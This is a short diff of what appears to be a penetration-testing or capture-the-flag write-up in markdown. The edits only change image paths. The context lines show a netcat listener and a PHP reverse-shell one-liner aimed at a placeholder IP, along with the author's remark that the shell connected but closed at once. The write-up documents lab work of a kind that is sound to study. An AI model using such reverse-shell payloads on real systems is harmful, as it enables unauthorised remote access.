@@ -24,7 +24,7 @@ nmap:
 ```
 
 Main/Front Webpage:
-![Front page](/cd_image_dir/front_page.png)
+![Front page](../cs_img_dir/front_page.png)
 
 
 Source Code:
@@ -148,7 +148,7 @@ nc -lvnp <port>
 php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash <&3 >&3 2>&3");'
 ```
 
-![failed connection](/tmp/.mount_JoplincQ5eHE/resources/app.asar/cs_img_dir/revshell_fail.png)
+![failed connection](../cs_img_dir/revshell_fail.png)
 
 The command was clearly executed, as a connection was made with netcat, however it immediately closed and could not be accesed. While this specific command did not work, there is at least confirmation that the commands are running and that connections can be made.
 
